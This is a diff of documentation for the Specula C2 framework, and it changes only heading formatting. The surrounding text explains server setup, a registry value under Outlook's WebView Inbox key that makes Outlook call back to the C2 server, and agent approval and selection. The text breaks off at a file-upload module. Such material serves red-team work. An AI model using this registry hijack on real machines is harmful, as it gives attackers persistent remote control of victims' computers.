@@ -14,7 +14,7 @@ To establish a C2 channel, an attacker can modify a single non-privileged Regist
 {% tab title="Setting up" %}
 You can use IP addresses, but a recommendation is to use a DNS record. In this example we are going to use DNS. Start by pointing a DNS record towards your public IP of the server you will be using as a Specula server. Let us pretend that we created an A-record named demo.specula.com with the value of our public IP.
 
-#### HTTPS
+**HTTPS**
 
 If you are planning to use SSL (Recommended) you will need to request the certificates. This guide shows how to do that with free let's encrypt certificates. We first need to install certbot:
 
@@ -37,7 +37,7 @@ This will produce certificate files so note down the paths to them, since you wi
 
 The path to fullchain.pem will be the input when Specula asks for the _cert\_file_ as part of the startup and the privkey.pem will be to the _key\_file_.
 
-#### Setting up Specula
+**Setting up Specula**
 
 First you should install a python virtual environment. You can of course install to the global package root, but this can cause issues that are later hard to diagnose.
 
@@ -49,7 +49,7 @@ source venv/bin/activate
 pip install -r requirements.txt
 ```
 
-#### Starting Specula
+**Starting Specula**
 
 ```
 sudo python specula.py
@@ -59,7 +59,7 @@ Since this is the first time you are starting Specula it will ask you for a vari
 {% endtab %}
 
 {% tab title="Hook an agent" %}
-### Edit Registry
+#### Edit Registry
 
 To hook an agent, all you need to do is to create the registry `REG_SZ` value of `URL` under `HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox` and add the value pointing to your validation url on the Specula server.
 
@@ -73,7 +73,7 @@ SpeculaC2> generatehooker
 
 <figure><img src="../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
 
-### Approve Agent
+#### Approve Agent
 
 The agent should now show up in Specula and depending on setup, you will either need to approve it manually (if initial\_checkin\_count is set to 0) or you will have to wait until the necessary checkins have been reached before Specula will generate an encryption key and send back to the agent. On the Outlook side when everything is completed, it will change view from Inbox to Calendar. Once you change view back to Inbox you have a fully Specula agent running.
 
@@ -90,7 +90,7 @@ Agent will be approved on next callback
 {% endtab %}
 
 {% tab title="Execute" %}
-### Select Agent
+#### Select Agent
 
 In order to assign tasks to agents and execute code, we first need to select it
 
@@ -103,7 +103,7 @@ id  hostname:username             ip address        refreshTime  Lastseen       
 SpeculaC2> interact 1
 ```
 
-### Execute a module
+#### Execute a module
 
 ```powershell
 # Upload a file
